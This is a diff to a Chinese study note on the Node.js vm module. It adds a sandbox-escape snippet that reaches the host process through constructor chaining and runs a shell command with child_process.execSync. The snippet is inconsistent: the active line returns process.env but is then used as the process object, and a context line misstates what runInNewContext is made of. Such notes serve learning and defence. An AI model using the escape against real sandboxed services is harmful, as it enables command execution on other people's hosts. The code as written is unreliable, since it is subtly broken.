@@ -56,5 +56,15 @@ console.log(contextObject);
 如果 `options` 是字符串，则指定文件名。
 简单的说 `vm.runInNewContext = vm.createContext + vm.createContext`
 
+### vm沙箱逃逸方法
+#### 传递对象逃逸
+```js
+const vm = require("vm");
+
+const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
+//const y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);
+return y1.mainModule.require('child_process').execSync('whoami').toString()
+console.log(y1);
+```
 
 ## 参考文章
